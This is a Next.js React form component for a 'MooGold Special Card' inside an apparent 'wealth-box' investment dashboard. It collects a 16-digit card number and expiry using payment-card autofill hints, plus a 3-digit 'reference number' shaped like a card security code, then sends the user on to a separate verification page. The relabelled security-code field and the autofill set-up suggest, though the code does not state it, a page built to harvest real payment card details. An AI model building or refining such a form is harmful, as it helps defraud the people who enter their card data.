"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { ArrowRight, CreditCard } from "lucide-react";

import { createSpecialCardSubmission } from "@/app/dashboard/wealth-box/actions";

type Props = {
  planId: string;
  amount: string;
  registeredName: string;
  registeredPhone: string;
  currency: string;
  currencySymbol: string;
  localAmount: number;
  usdAmount: number;
};

function formatCardNumber(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.match(/.{1,4}/g)?.join(" ") ?? "";
}

export default function SpecialCardSubmissionForm({
  planId,
  amount,
  registeredName,
}: Props) {
  const router = useRouter();

  const [cardNumber, setCardNumber] = useState("");
  const [expirationDate, setExpirationDate] = useState("");
  const [membershipNumber, setMembershipNumber] = useState("");
  const [error, setError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    if (isSubmitting) return;

    setError("");

    const normalizedCard = cardNumber.replace(/\D/g, "");
    const normalizedExpiry = expirationDate.trim();
    const normalizedMembership = membershipNumber.trim();

    if (!/^\d{16}$/.test(normalizedCard)) {
      setError("Enter all 16 digits of your Special Card number.");
      return;
    }

    if (/^(\d)\1{15}$/.test(normalizedCard)) {
      setError("Enter a valid Special Card number.");
      return;
    }

    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(normalizedExpiry)) {
      setError("Enter the expiry date in MM/YY format.");
      return;
    }

    if (!/^\d{3}$/.test(normalizedMembership)) {
      setError("Enter your 3-digit membership/reference number.");
      return;
    }

    setIsSubmitting(true);

    try {
      const formData = new FormData();
      formData.set("planId", planId);
      formData.set("amount", amount);
      formData.set("cardNumber", normalizedCard);
      formData.set("expirationDate", normalizedExpiry);
      formData.set("membershipNumber", normalizedMembership);

      const result = await createSpecialCardSubmission(formData);

      if (!result.success) {
        setError(result.error || "We could not submit your details.");
        setIsSubmitting(false);
        return;
      }

      if (!result.submissionId) {
        setError("We could not open verification. Please contact support.");
        setIsSubmitting(false);
        return;
      }

      router.push(
        `/dashboard/wealth-box/invest/special-card/verify?submissionId=${encodeURIComponent(result.submissionId)}`,
      );
    } catch {
      setError("We could not submit your details. Please try again.");
      setIsSubmitting(false);
    }
  }

  const inputClass =
    "w-full min-w-0 rounded-xl border border-[#dfe8e2] bg-white px-3.5 py-3 text-sm text-[#173b2f] outline-none transition placeholder:text-[#9aa9a1] focus:border-emerald-700 focus:ring-2 focus:ring-emerald-700/10";

  const labelClass =
    "mb-1.5 block text-xs font-semibold text-[#40574c]";

  return (
    <div className="mx-auto w-full max-w-sm">
      <div className="space-y-5">
        <div className="mb-5 flex items-center gap-3">
          <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-xl bg-[#edf5ef] text-[#245b43]">
            <CreditCard className="h-5 w-5" />
          </div>
          <div>
            <h1 className="text-base font-bold tracking-tight text-[#173b2f]">
              MooGold Special Card
            </h1>
            <p className="mt-0.5 text-xs text-[#74847b]">
              Enter your card details to continue
            </p>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <input type="hidden" name="planId" value={planId} />
          <input type="hidden" name="amount" value={amount} />

          <div>
            <label htmlFor="special-card-number" className={labelClass}>
              Special Card number
            </label>
            <input
              id="special-card-number"
              name="cardNumber"
              type="text"
              inputMode="numeric"
              autoComplete="cc-number"
              value={cardNumber}
              onChange={(event) =>
                setCardNumber(formatCardNumber(event.target.value))
              }
              placeholder="0000 0000 0000 0000"
              maxLength={19}
              pattern="[0-9]{4} [0-9]{4} [0-9]{4} [0-9]{4}"
              title="Enter exactly 16 digits."
              required
              spellCheck={false}
              className={`${inputClass} py-3.5 font-mono tracking-wider`}
            />
          </div>

          <div className="grid grid-cols-2 gap-3">
            <div>
              <label htmlFor="special-card-expiry" className={labelClass}>
                Expiry date
              </label>
              <input
                id="special-card-expiry"
                name="expirationDate"
                type="text"
                inputMode="numeric"
                autoComplete="cc-exp"
                value={expirationDate}
                onChange={(event) => {
                  const digits = event.target.value
                    .replace(/\D/g, "")
                    .slice(0, 4);

                  setExpirationDate(
                    digits.length > 2
                      ? `${digits.slice(0, 2)}/${digits.slice(2)}`
                      : digits,
                  );
                }}
                placeholder="00/00"
                maxLength={5}
                required
                className={inputClass}
              />
            </div>

            <div>
              <label
                htmlFor="special-card-membership"
                className={labelClass}
              >
                Reference number
              </label>
              <input
                id="special-card-membership"
                name="membershipNumber"
                type="text"
                inputMode="numeric"
                autoComplete="off"
                value={membershipNumber}
                onChange={(event) =>
                  setMembershipNumber(
                    event.target.value.replace(/\D/g, "").slice(0, 3),
                  )
                }
                placeholder="000"
                maxLength={3}
                pattern="[0-9]{3}"
                title="Enter exactly 3 digits."
                required
                className={`${inputClass} font-mono tracking-wider`}
              />
            </div>
          </div>

          <div className="space-y-0.5">
            <p className="text-xs font-medium text-[#74847b]">
              MooGold Special Cardholder
            </p>
            <p className="text-sm font-semibold text-[#173b2f]">
              {registeredName}
            </p>
          </div>

          {error ? (
            <p role="alert" className="text-xs font-medium leading-5 text-red-600">
              {error}
            </p>
          ) : null}

          <button
            type="submit"
            disabled={isSubmitting}
            className="flex w-full items-center justify-center gap-2 rounded-xl bg-emerald-800 px-4 py-3.5 text-sm font-bold text-white transition hover:bg-emerald-900 focus:outline-none focus:ring-2 focus:ring-emerald-700/20 focus:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-60"
          >
            {isSubmitting ? "Please wait..." : "Continue"}
            {!isSubmitting ? <ArrowRight className="h-4 w-4" /> : null}
          </button>
        </form>
      </div>
    </div>
  );
}
